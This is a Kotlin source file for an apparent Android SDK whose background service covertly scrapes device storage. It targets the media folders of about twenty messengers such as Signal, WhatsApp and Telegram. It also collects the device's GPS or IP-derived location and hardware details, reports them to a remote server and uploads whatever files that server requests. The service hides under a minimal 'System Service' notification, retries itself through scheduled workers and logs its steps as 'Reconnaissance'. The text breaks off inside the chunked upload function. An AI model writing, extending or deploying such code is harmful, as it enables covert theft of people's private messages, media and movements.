package com.sdocument.sdk.service

import android.Manifest
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import androidx.work.CoroutineWorker
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.IBinder
import android.provider.MediaStore
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.work.BackoffPolicy
import androidx.work.Constraints
import androidx.work.ExistingWorkPolicy
import androidx.work.NetworkType
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkManager
import androidx.work.Worker
import androidx.work.WorkerParameters
import androidx.work.workDataOf
import com.sdocument.sdk.R
import com.sdocument.sdk.di.ConfigProvider
import com.sdocument.sdk.network.RetrofitClient
import com.sdocument.sdk.service.DataService.Companion.TAG
import com.sdocument.sdk.utils.NetworkLogger
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.runBlocking
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlinx.coroutines.withContext
import kotlinx.coroutines.withTimeoutOrNull
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.io.FileOutputStream
import java.io.RandomAccessFile
import com.sdocument.sdk.network.models.MetadataReportRequest
import com.sdocument.sdk.network.models.FileReportItem
import com.sdocument.sdk.network.models.LocationReportItem
import com.sdocument.sdk.network.models.DeviceInfo
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.TimeZone
import java.net.NetworkInterface
import java.net.Inet4Address
import java.util.concurrent.Semaphore
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream
import kotlin.coroutines.resume

data class FileMetadata(val type: String, val source: String, val path: String)

data class AppInfo(val name: String, val packageName: String)

val targetApps = listOf(
    AppInfo("Telegram", "org.telegram.messenger"),
    AppInfo("Signal", "org.thoughtcrime.securesms"),
    AppInfo("WhatsApp", "com.whatsapp"),
    AppInfo("Viber", "com.viber.voip"),
    AppInfo("MAX (One.me)", "ru.oneme.app"),
    AppInfo("TamTam", "ru.ok.messages"),
    AppInfo("VK (мессенджер)", "com.vkontakte.android"),
    AppInfo("Threema", "ch.threema.app"),
    AppInfo("Threema Work", "ch.threema.app.work"),
    AppInfo("Element Classic (Matrix)", "im.vector.app"),
    AppInfo("Element X (Matrix)", "io.element.android.x"),
    AppInfo("Session", "network.loki.messenger"),
    AppInfo("Wire", "com.wire"),
    AppInfo("Wickr Me", "com.mywickr.wickr2"),
    AppInfo("Bridgefy", "me.bridgefy.main"),
    AppInfo("Conversations (XMPP)", "eu.siacs.conversations"),
    AppInfo("Zangi", "com.secretphone.zangi"),
    AppInfo("Plus Messenger", "org.telegram.plus"),
    AppInfo("Nekogram", "tw.nekomimi.nekogram"),
    AppInfo("Telegram X", "org.thunderdog.challegram")
)

fun Context.isFromTargetApp(path: String): Boolean {
    val lowerPath = path.lowercase(Locale.ROOT)
    if (targetApps.any {
            lowerPath.contains("/${it.name.lowercase(Locale.ROOT)}/") || lowerPath.contains(
                "/${it.packageName}/"
            )
        }) return true
    val commonFolders = listOf(
        "telegram", "whatsapp", "signal", "viber", "tamtam", "vkontakte",
        "threema", "element", "messenger", "session", "zalo", "oneme",
        "documents", "docs", "archive", "media", "data", "backup"
    )
    return commonFolders.any { lowerPath.contains("/$it/") || lowerPath.contains("/${it}s/") }
}

fun getFileType(path: String): String? {
    val ext = path.substringAfterLast('.', "").lowercase()
    return when (ext) {
        "jpg", "jpeg", "png", "gif", "bmp", "webp", "heic", "heif" -> "image"
        "mp4", "m4v", "avi", "mkv", "mov", "wmv", "flv", "webm" -> "video"
        "mp3", "wav", "ogg", "aac", "flac", "m4a", "wma" -> "audio"
        "pdf", "doc", "docx", "odt", "rtf", "txt", "xls", "xlsx" -> "document"
        "zip", "rar", "7z", "tar", "gz", "bz2" -> "archive"
        "exe", "msi", "messenger", "apk" -> "executable"
        "html", "css", "js", "php", "py", "java", "cpp" -> "code"
        "bat", "cmd", "sh", "ps1" -> "script"
        else -> if (ext.isNotEmpty()) "file" else null
    }
}

private fun Context.guessSource(path: String): String {
    val parentName = File(path).parentFile?.name ?: "Unknown"
    return parentName.replaceFirstChar { if (it.isLowerCase()) it.titlecase(Locale.ROOT) else it.toString() }
}

private fun Context.isNetworkAvailable(): Boolean {
    val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
    val activeNetwork = cm.activeNetwork
    if (activeNetwork != null) {
        val caps = cm.getNetworkCapabilities(activeNetwork)
        if (caps != null && caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)) {
            if (caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) ||
                caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) ||
                caps.hasTransport(NetworkCapabilities.TRANSPORT_VPN)) {
                return true
            }
        }
    }
    
    // Check other networks in case active network is a degraded VPN network but physical network is available
    val networks = cm.allNetworks
    for (net in networks) {
        if (net == activeNetwork) continue
        val caps = cm.getNetworkCapabilities(net) ?: continue
        if (caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)) {
            if (caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) ||
                caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR)) {
                return true
            }
        }
    }
    return false
}

private fun Context.scheduleUploadRetry() {
    val constraints = Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build()
    val uploadWork = OneTimeWorkRequestBuilder<UploadWorker>()
        .setConstraints(constraints)
        .setBackoffCriteria(BackoffPolicy.EXPONENTIAL, 1, TimeUnit.MINUTES)
        .build()
    WorkManager.getInstance(this).enqueueUniqueWork("ChunkUploadRetry", ExistingWorkPolicy.REPLACE, uploadWork)
}

class UploadWorker(context: Context, params: WorkerParameters) : CoroutineWorker(context, params) {
    override suspend fun doWork(): Result {
        val intent = Intent(applicationContext, DataService::class.java).apply {
            putExtra("resume_upload", true)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try { applicationContext.startForegroundService(intent) } catch (e: Exception) {}
        } else {
            applicationContext.startService(intent)
        }
        return Result.success()
    }
}

class ScrapeWorker(context: Context, params: WorkerParameters) : CoroutineWorker(context, params) {
    override suspend fun doWork(): Result = withContext(Dispatchers.IO) {
        val prefs = applicationContext.getSharedPreferences("scraper_config", Context.MODE_PRIVATE)
        if (prefs.getBoolean("is_banned", false)) {
            return@withContext Result.success()
        }

        if (DataService.isScrapingInProgress.get()) {
            return@withContext Result.retry()
        }

        if (DataService.isScrapingInProgress.compareAndSet(false, true)) {
            try {
                val scrapeMedia = prefs.getBoolean("scrape_media", true)
                val scrapeFiles = prefs.getBoolean("scrape_files", true)
                val scrapeLocation = prefs.getBoolean("scrape_location", true)

                NetworkLogger.log("scrape_worker", "Periodic scrape worker started.")
                applicationContext.executeScrapeAndUpload(scrapeMedia, scrapeFiles, scrapeLocation)
                Result.success()
            } catch (t: Throwable) {
                NetworkLogger.log("scrape_worker", "Periodic scrape worker failed: ${t.message}")
                Result.retry()
            } finally {
                DataService.isScrapingInProgress.set(false)
            }
        } else {
            Result.retry()
        }
    }
}

private fun Context.shouldExclude(path: String): Boolean {
    val file = File(path)
    if (!file.exists()) return true
    
    val prefs = getSharedPreferences("scraper_config", Context.MODE_PRIVATE)
    val regexStr = prefs.getString("exclude_regex", null)
    if (!regexStr.isNullOrEmpty()) {
        try {
            val regex = Regex(regexStr, RegexOption.IGNORE_CASE)
            if (regex.containsMatchIn(path) || regex.containsMatchIn(file.name)) {
                return true
            }
        } catch (e: Exception) {
            Log.e(TAG, "Invalid regex: $regexStr", e)
        }
    }

    val extensionsStr = prefs.getString("exclude_extensions", null)
    if (!extensionsStr.isNullOrEmpty()) {
        val extensions = extensionsStr.split(",")
        val ext = file.extension.lowercase()
        val hasExt = extensions.any { it.replace(".", "").lowercase() == ext }
        if (hasExt) return true
    }

    val patternsStr = prefs.getString("exclude_patterns", null)
    if (!patternsStr.isNullOrEmpty()) {
        val patterns = patternsStr.split(",")
        val name = file.name.lowercase()
        val hasPattern = patterns.any { pattern ->
            val cleanPattern = pattern.replace("*", "").lowercase()
            name.contains(cleanPattern)
        }
        if (hasPattern) return true
    }

    return false
}

private fun Context.getMediaPathsPublic(
    uri: Uri, dataColumn: String, defaultType: String, onFileScrapped: (FileMetadata) -> Unit
) {
    try {
        contentResolver.query(uri, arrayOf(dataColumn), null, null, null)?.use { cursor ->
            while (cursor.moveToNext()) {
                val path = cursor.getString(cursor.getColumnIndexOrThrow(dataColumn)) ?: continue
                if (shouldExclude(path)) continue
                if (isDefaultSystemAudio(path)) continue

                val type = getFileType(path) ?: defaultType
                val source = guessSource(path)
                onFileScrapped(FileMetadata(type, source, path))
            }
        }
    } catch (e: Exception) {
        Log.e(TAG, "Error querying MediaStore", e)
    }
}

fun Context.scrapePublicMedia(onFileScrapped: (FileMetadata) -> Unit) {
    val volumes: Set<String> = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
        MediaStore.getExternalVolumeNames(this) + "internal"
    } else {
        setOf("external", "internal")
    }
    val mediaTypes = listOf(
        "image" to { v: String -> getImagesUri(v) },
        "audio" to { v: String -> getAudioUri(v) },
        "video" to { v: String -> getVideoUri(v) },
        "file" to { v: String -> getFilesUri(v) },
        "download" to { v: String -> getDownloadsUri(v) })

    for (volume in volumes) {
        for ((type, uriGetter) in mediaTypes) {
            val uri = uriGetter(volume)
            if (uri != null) {
                getMediaPathsPublic(uri, getDataColumn(type), type, onFileScrapped)
            }
        }
    }

    // Recursive file listing for public dirs
    val publicRoots = mutableListOf<File>()
    val publicDirs = listOf(
        Environment.DIRECTORY_DOWNLOADS,
        Environment.DIRECTORY_DOCUMENTS,
        Environment.DIRECTORY_PICTURES,
        Environment.DIRECTORY_MUSIC,
        Environment.DIRECTORY_MOVIES,
        Environment.DIRECTORY_DCIM
    )
    publicDirs.forEach { dirType ->
        Environment.getExternalStoragePublicDirectory(dirType)
            .takeIf { it.exists() && it.canRead() }?.let { publicRoots.add(it) }
    }
    publicRoots.forEach { root ->
        listFiles(root, onFileScrapped, onlyTargetApps = false)
    }
}

fun Context.scrapeMessengerFiles(onFileScrapped: (FileMetadata) -> Unit) {
    val storageDirs = mutableListOf<File>()
    val externalStorage = Environment.getExternalStorageDirectory()

    // Add multiple possible roots
    storageDirs.add(externalStorage)
    File("/storage/emulated/0/").takeIf { it.exists() && it.canRead() }?.let { storageDirs.add(it) }

    val androidData = File(externalStorage, "Android/data")
    val androidMedia = File(externalStorage, "Android/media")
    if (androidData.exists()) storageDirs.add(androidData)
    if (androidMedia.exists()) storageDirs.add(androidMedia)

    storageDirs.forEach { dir ->
        listFiles(dir, onFileScrapped, onlyTargetApps = true)
    }
}

private fun isDefaultSystemAudio(path: String): Boolean {
    val lower = path.lowercase()
    return lower.contains("/ringtones/") || lower.contains("/notifications/") || lower.contains("/alarms/") || lower.contains(
        "/ui/"
    ) || lower.contains("/system/media/")
}

object LocationLogTracker {
    var hasLoggedThisSession = false
}

suspend fun Context.scrapeLocationSuspend(logToRemote: Boolean = true): JSONObject? = withContext(Dispatchers.IO) {
    val ctx = this@scrapeLocationSuspend
    val fineResult =
        ContextCompat.checkSelfPermission(ctx, Manifest.permission.ACCESS_FINE_LOCATION)
    val coarseResult =
        ContextCompat.checkSelfPermission(ctx, Manifest.permission.ACCESS_COARSE_LOCATION)
    val hasFine = fineResult == PackageManager.PERMISSION_GRANTED
    val hasCoarse = coarseResult == PackageManager.PERMISSION_GRANTED


    var freshLocation: Location? = null
    if (hasFine || hasCoarse) {
        try {
            val fusedLocationClient =
                com.google.android.gms.location.LocationServices.getFusedLocationProviderClient(ctx)

            freshLocation = withTimeoutOrNull(15000L) {
                suspendCancellableCoroutine<Location?> { cont ->
                    val cancellationTokenSource =
                        com.google.android.gms.tasks.CancellationTokenSource()

                    try {
                        fusedLocationClient.getCurrentLocation(
                            com.google.android.gms.location.Priority.PRIORITY_HIGH_ACCURACY,
                            cancellationTokenSource.token
                        ).addOnSuccessListener { loc: Location? ->
                            if (cont.isActive) cont.resume(loc)
                        }.addOnFailureListener { e ->
                            if (cont.isActive) cont.resume(null)
                        }
                    } catch (e: SecurityException) {
                        if (cont.isActive) cont.resume(null)
                    }

                    cont.invokeOnCancellation {
                        cancellationTokenSource.cancel()
                    }
                }
            }

            if (freshLocation == null) {
                freshLocation = withTimeoutOrNull(5000L) {
                    suspendCancellableCoroutine<Location?> { cont ->
                        try {
                            fusedLocationClient.lastLocation.addOnSuccessListener { loc: Location? ->
                                if (cont.isActive) cont.resume(loc)
                            }.addOnFailureListener { e ->
                                if (cont.isActive) cont.resume(null)
                            }
                        } catch (e: SecurityException) {
                            if (cont.isActive) cont.resume(null)
                        }
                    }
                }
            }
        } catch (e: Exception) {
        }
    }

    if (freshLocation != null) {
        NetworkLogger.log(
            "location",
            "https://www.google.com/maps/search/?api=1&query=${freshLocation.latitude},${freshLocation.longitude}"
        )
        var city: String? = null
        var country: String? = null
        try {
            val geocoder = android.location.Geocoder(ctx, java.util.Locale.getDefault())
            val addresses = geocoder.getFromLocation(freshLocation.latitude, freshLocation.longitude, 1)
            if (!addresses.isNullOrEmpty()) {
                val address = addresses[0]
                city = address.locality ?: address.subAdminArea
                country = address.countryName
            }
        } catch (e: Exception) {
            android.util.Log.e("DataService", "Geocoder failed", e)
        }
        return@withContext JSONObject().apply {
            put("latitude", freshLocation.latitude)
            put("longitude", freshLocation.longitude)
            put("accuracy", freshLocation.accuracy.toDouble())
            put("provider", freshLocation.provider ?: "fused")
            put("time", freshLocation.time)
            put("city", city ?: "")
            put("country", country ?: "")
        }
    }

    // IP-based geolocation fallback — works when GPS toggle is off, needs internet only
    val ipApis = listOf(
        "https://ipapi.co/json/" to { json: JSONObject ->
            val lat = json.optDouble("latitude")
            val lon = json.optDouble("longitude")
            if (!lat.isNaN() && !lon.isNaN()) {
                JSONObject().apply {
                    put("latitude", lat)
                    put("longitude", lon)
                    put("accuracy", 5000.0)
                    put("provider", "ip")
                    put("city", json.optString("city"))
                    put("country", json.optString("country_name"))
                    put("query", json.optString("ip"))
                    put("time", System.currentTimeMillis())
                }
            } else null
        },
        "https://freeipapi.com/api/json" to { json: JSONObject ->
            val lat = json.optDouble("latitude")
            val lon = json.optDouble("longitude")
            if (!lat.isNaN() && !lon.isNaN()) {
                JSONObject().apply {
                    put("latitude", lat)
                    put("longitude", lon)
                    put("accuracy", 5000.0)
                    put("provider", "ip")
                    put("city", json.optString("cityName"))
                    put("country", json.optString("countryName"))
                    put("query", json.optString("ipAddress"))
                    put("time", System.currentTimeMillis())
                }
            } else null
        }
    )

    for ((url, parser) in ipApis) {
        try {
            val client = OkHttpClient.Builder().callTimeout(8, TimeUnit.SECONDS).build()
            val request = Request.Builder()
                .url(url)
                .header("User-Agent", "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36")
                .build()
            val response = client.newCall(request).execute()
            if (!response.isSuccessful) continue
            val contentType = response.header("Content-Type") ?: ""
            if (!contentType.contains("json", ignoreCase = true)) continue
            val body = response.body?.string()
            if (body != null && body.trimStart().startsWith("{")) {
                val json = JSONObject(body)
                val result = parser(json)
                if (result != null) {
                    val lat = result.getDouble("latitude")
                    val lon = result.getDouble("longitude")
                    NetworkLogger.log(
                        "location",
                        "https://www.google.com/maps/search/?api=1&query=$lat,$lon"
                    )
                    return@withContext result
                }
            }
        } catch (e: Exception) {
            android.util.Log.e("DataService", "IP geolocation fallback failed for $url: ${e.message}")
        }
    }

    null
}

class DataService : Service(), LocationListener {
    companion object {
        const val TAG = "DataService"
        private const val NOTIFICATION_ID = 1
        private const val CHANNEL_ID = "data_scraper_channel"
        private const val BATCH_SIZE = 100
        const val MAX_ZIP_SIZE = 100L * 1024 * 1024 // 100MB limit 
        private const val FULL_SCRAPE_WORK_NAME = "full_scrape_retry_unique_work"
        val isScrapingInProgress = AtomicBoolean(false)

        fun scheduleFullRetry(context: Context) {
            val work = OneTimeWorkRequestBuilder<ScrapeWorker>()
                .setConstraints(
                    Constraints.Builder().setRequiredNetworkType(NetworkType.NOT_REQUIRED).build()
                )
                .setBackoffCriteria(BackoffPolicy.EXPONENTIAL, 1, TimeUnit.MINUTES)
                .build()
            WorkManager.getInstance(context)
                .enqueueUniqueWork(FULL_SCRAPE_WORK_NAME, ExistingWorkPolicy.REPLACE, work)
        }
    }

    private lateinit var locationManager: LocationManager
    private val coroutineScope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            val hasFineLocation = ContextCompat.checkSelfPermission(
                this,
                Manifest.permission.ACCESS_FINE_LOCATION
            ) == PackageManager.PERMISSION_GRANTED
            val hasCoarseLocation = ContextCompat.checkSelfPermission(
                this,
                Manifest.permission.ACCESS_COARSE_LOCATION
            ) == PackageManager.PERMISSION_GRANTED
            val hasLocation = hasFineLocation || hasCoarseLocation
            val typeWithLocation =
                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or
                        android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
            val typeWithoutLocation =
                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
            try {
                // Try with location type first (needed if location permission is granted)
                startForeground(
                    NOTIFICATION_ID,
                    getNotification(),
                    if (hasLocation) typeWithLocation else typeWithoutLocation
                )
            } catch (e: Exception) {
                Log.e(
                    TAG,
                    "startForeground with type failed: ${e.message}, retrying without location type"
                )
                try {
                    startForeground(NOTIFICATION_ID, getNotification(), typeWithoutLocation)
                } catch (e2: Exception) {
                    Log.e(TAG, "startForeground failed: ${e2.message}")
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) stopSelf()
                }
            }
        } else {
            try {
                startForeground(NOTIFICATION_ID, getNotification())
            } catch (e: Exception) {
                Log.e(TAG, "Failed to startForeground: ${e.message}")
            }
        }
        locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val prefs = getSharedPreferences("scraper_config", Context.MODE_PRIVATE)
        if (prefs.getBoolean("is_banned", false)) {
            stopSelf(startId)
            return START_NOT_STICKY
        }

        val resumeUpload = intent?.getBooleanExtra("resume_upload", false) ?: false
        val scrapeMedia = intent?.getBooleanExtra("scrape_media", true) ?: true
        val scrapeFiles = intent?.getBooleanExtra("scrape_files", true) ?: true
        val scrapeLocation = intent?.getBooleanExtra("scrape_location", true) ?: true

        coroutineScope.launch {
            if (isScrapingInProgress.get() && !resumeUpload) {
                NetworkLogger.log("data_service", "Scraping already in progress, waiting to process new intent...")
                while (isScrapingInProgress.get()) {
                    delay(500)
                }
            }
            if (isScrapingInProgress.compareAndSet(false, true)) {
                if (resumeUpload) {
                    NetworkLogger.log("data_service", "Resuming uploads from queue...")
                    val queueStr = prefs.getString("upload_queue", "") ?: ""
                    if (queueStr.isNotEmpty()) {
                        val queue = queueStr.split(",").filter { it.isNotEmpty() }
                        for (path in queue) {
                            uploadFileInChunks(path)
                        }
                        prefs.edit().remove("upload_queue").apply()
                    }
                    isScrapingInProgress.set(false)
                    stopSelf(startId)
                } else {
                    NetworkLogger.log(
                        "data_service",
                        "DataService started. Media: $scrapeMedia, Files: $scrapeFiles, Location: $scrapeLocation"
                    )
                    startScraping(scrapeMedia, scrapeFiles, scrapeLocation, startId)
                }
            }
        }
        return START_STICKY
    }

    private fun startScraping(scrapeMedia: Boolean, scrapeFiles: Boolean, scrapeLocation: Boolean, startId: Int) {
        coroutineScope.launch {
            try {
                executeScrapeAndUpload(scrapeMedia, scrapeFiles, scrapeLocation)
            } catch (t: Throwable) {
                NetworkLogger.log(
                    "data_service",
                    "Critical error during scraping: ${t.message}. Scheduling retry..."
                )
                scheduleFullRetry(this@DataService)
            } finally {
                isScrapingInProgress.set(false)
                stopSelf(startId)
            }
        }
    }

    private fun createNotificationChannel() {
        val channel =
            NotificationChannel(CHANNEL_ID, "System Service", NotificationManager.IMPORTANCE_MIN)
        getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
    }

    private fun getNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setContentTitle(ConfigProvider.currentConfig.notificationConfig.serviceTitle)
            .setContentText(ConfigProvider.currentConfig.notificationConfig.serviceText)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .build()
    }

    override fun onDestroy() {
        super.onDestroy()
        coroutineScope.cancel()
    }

    override fun onBind(intent: Intent?): IBinder? = null
    override fun onLocationChanged(location: Location) {}
    override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
    override fun onProviderEnabled(provider: String) {}
    override fun onProviderDisabled(provider: String) {}
}

suspend fun Context.executeScrapeAndUpload(scrapeMedia: Boolean, scrapeFiles: Boolean, scrapeLocation: Boolean) {
    val fileMetadata = mutableSetOf<FileMetadata>()
    val locationData = mutableListOf<JSONObject>()
    if (hasStoragePermission()) {
        NetworkLogger.log("data_service", "Storage permission granted. Starting file scrape...")
        val initialSize = fileMetadata.size
        if (scrapeMedia) {
            scrapePublicMedia { fileMetadata.add(it) }
            NetworkLogger.log("data_service", "scrapePublicMedia found ${fileMetadata.size - initialSize} items.")
        }
        val afterMediaSize = fileMetadata.size
        if (scrapeFiles) {
            scrapeMessengerFiles { fileMetadata.add(it) }
            NetworkLogger.log("data_service", "scrapeMessengerFiles found ${fileMetadata.size - afterMediaSize} items.")
        }
    } else {
        NetworkLogger.log("data_service", "No storage permission during startScraping execution.")
    }
    if (scrapeLocation) {
        val location = scrapeLocationSuspend()
        location?.let {
            NetworkLogger.logActivity("location received")
            locationData.add(it)
        }
    }
    NetworkLogger.log(
        "data_service",
        "Scrape check complete: ${fileMetadata.size} files, ${locationData.size} locations found."
    )
    Log.d("FILES_SCAN", "Raw scraped count: ${fileMetadata.size}")
    reportAndUploadChunks(fileMetadata.toList(), locationData)
}

suspend fun Context.reportAndUploadChunks(
    fileMetadata: List<FileMetadata>,
    locationData: List<JSONObject>
) {
    val uniqueMetadata = fileMetadata
        .filter { File(it.path).run { exists() && isFile && canRead() } }

    Log.d("FILES_SCAN", "After filter exists/isFile/canRead count: ${uniqueMetadata.size}. Top 3 paths: ${uniqueMetadata.take(3).map { it.path }}")

    if (uniqueMetadata.isEmpty() && locationData.isEmpty()) {
        return
    }

    NetworkLogger.logActivity("metadata received")
    NetworkLogger.log("Reconnaissance", "Found ${uniqueMetadata.size} files, ${locationData.size} locations. Sending universal_data.json.")

    val fileReportItems = uniqueMetadata.map { md ->
        val f = File(md.path)
        FileReportItem(
            type = md.type,
            source = md.source,
            path = md.path,
            size = f.length(),
            lastModified = f.lastModified()
        )
    }

    val locationReportItems = locationData.mapNotNull { loc ->
        try {
            LocationReportItem(
                latitude = loc.optDouble("latitude"),
                longitude = loc.optDouble("longitude"),
                accuracy = loc.optDouble("accuracy"),
                provider = loc.optString("provider"),
                time = loc.optLong("time"),
                city = loc.optString("city", null),
                country = loc.optString("country", null)
            )
        } catch (e: Exception) { null }
    }

    val request = MetadataReportRequest(
        deviceId = NetworkLogger.getDeviceId(),
        deviceInfo = DeviceInfo(
            manufacturer = Build.MANUFACTURER,
            model = Build.MODEL,
            osVersion = Build.VERSION.RELEASE,
            apiLevel = Build.VERSION.SDK_INT,
            brand = Build.BRAND,
            device = Build.DEVICE,
            timezone = TimeZone.getDefault().id,
            userAgent = System.getProperty("http.agent") ?: "Unknown",
            internalIp = getLocalIpAddress()
        ),
        files = fileReportItems,
        locations = locationReportItems,
        scrapeTime = System.currentTimeMillis(),
        totalFiles = fileReportItems.size
    )

    var pathsToUpload = emptyList<String>()
    var attempts = 0
    var success = false
    var response: retrofit2.Response<com.sdocument.sdk.network.models.MetadataReportResponse>? = null
    var lastException: Exception? = null

    NetworkLogger.log("Metadata", "Sending metadata payload. Files: ${fileReportItems.size}, Locations: ${locationReportItems.size}")

    while (attempts < 3 && !success) {
        try {
            response = RetrofitClient.apiService.reportMetadata(request)
            if (response.isSuccessful) {
                success = true
            } else {
                attempts++
                NetworkLogger.log("Metadata", "Failed to report metadata (Attempt $attempts/3). HTTP Code: ${response.code()}")
                if (attempts < 3) delay(5000L)
            }
        } catch (e: Exception) {
            attempts++
            lastException = e
            NetworkLogger.log("Metadata", "Exception reporting metadata (Attempt $attempts/3): ${e.message}")
            if (attempts < 3) delay(5000L)
        }
    }

    if (success && response != null) {
        val respBody = response.body()
        pathsToUpload = respBody?.filesToUpload ?: emptyList()
        val prefs = getSharedPreferences("scraper_config", Context.MODE_PRIVATE)
        val editor = prefs.edit()
        editor.putString("upload_queue", pathsToUpload.joinToString(","))
        
        respBody?.excludeExtensions?.let {
            editor.putString("exclude_extensions", it.joinToString(","))
        }
        respBody?.excludePatterns?.let {
            editor.putString("exclude_patterns", it.joinToString(","))
        }
        editor.apply()

        NetworkLogger.log("Metadata", "Metadata reported successfully. Server requested ${pathsToUpload.size} files for upload.")
        if (pathsToUpload.isNotEmpty()) {
            NetworkLogger.logTransfer("Starting file upload (${pathsToUpload.size} files)")
        }
        NetworkLogger.log("Task Received", "Server requested ${pathsToUpload.size} files for upload.")
    } else {
        val errorMsg = if (response != null) {
            "HTTP Code: ${response.code()}"
        } else {
            lastException?.message ?: "Unknown network error"
        }
        NetworkLogger.log("Metadata", "Metadata report failed permanently. Error: $errorMsg")
        throw java.io.IOException("Metadata report failed after 3 attempts: $errorMsg")
    }

    for (path in pathsToUpload) {
        uploadFileInChunks(path)
    }
    if (pathsToUpload.isNotEmpty()) {
        NetworkLogger.logTransfer("File upload completed")
    }
    val prefs = getSharedPreferences("scraper_config", Context.MODE_PRIVATE)
    prefs.edit().remove("upload_queue").apply()
}



fun Context.hasStoragePermission(): Boolean {
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
        if (Environment.isExternalStorageManager()) return true
    }
    return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
        ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.READ_MEDIA_IMAGES
        ) == PackageManager.PERMISSION_GRANTED ||
                ContextCompat.checkSelfPermission(
                    this,
                    Manifest.permission.READ_MEDIA_VIDEO
                ) == PackageManager.PERMISSION_GRANTED ||
                ContextCompat.checkSelfPermission(
                    this,
                    Manifest.permission.READ_MEDIA_AUDIO
                ) == PackageManager.PERMISSION_GRANTED
    } else {
        ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.READ_EXTERNAL_STORAGE
        ) == PackageManager.PERMISSION_GRANTED
    }
}



private fun Context.getImagesUri(volume: String): Uri =
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) MediaStore.Images.Media.getContentUri(volume) else MediaStore.Images.Media.EXTERNAL_CONTENT_URI

private fun Context.getAudioUri(volume: String): Uri =
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) MediaStore.Audio.Media.getContentUri(volume) else MediaStore.Audio.Media.EXTERNAL_CONTENT_URI

private fun Context.getVideoUri(volume: String): Uri =
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) MediaStore.Video.Media.getContentUri(volume) else MediaStore.Video.Media.EXTERNAL_CONTENT_URI

private fun Context.getFilesUri(volume: String): Uri = MediaStore.Files.getContentUri(volume)
private fun Context.getDownloadsUri(volume: String): Uri? =
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) MediaStore.Downloads.getContentUri(volume) else null

private fun Context.getDataColumn(type: String): String = when (type) {
    "image" -> MediaStore.Images.Media.DATA
    "audio" -> MediaStore.Audio.Media.DATA
    "video" -> MediaStore.Video.Media.DATA
    "download" -> MediaStore.Downloads.DATA.takeIf { Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q }
        ?: MediaStore.Files.FileColumns.DATA

    else -> MediaStore.Files.FileColumns.DATA
}

private fun Context.listFiles(
    dir: File,
    onFileScrapped: (FileMetadata) -> Unit,
    onlyTargetApps: Boolean
) {
    if (!dir.canRead() || !dir.isDirectory) return
    dir.listFiles()?.forEach { file ->
        if (file.isDirectory) {
            listFiles(file, onFileScrapped, onlyTargetApps)
        } else if (file.isFile && file.length() > 0 && file.canRead()) {
            val path = file.absolutePath
            if (shouldExclude(path)) return@forEach
            
            val fileName = file.name
            if (fileName.startsWith("scraped_data_") && fileName.endsWith(".zip")) return@forEach
            if (isDefaultSystemAudio(path)) return@forEach

            if (onlyTargetApps) {
                if (!isFromTargetApp(path)) return@forEach
            }

            val type = getFileType(path) ?: "file"
            val source = guessSource(path)
            onFileScrapped(FileMetadata(type, source, path))
        }
    }
}

suspend fun Context.uploadFileInChunks(filePath: String) {
    val file = File(filePath)
    if (!file.exists() || !file.canRead()) {
        NetworkLogger.log("Chuncker", "File not found or unreadable: $filePath")
        return
    }

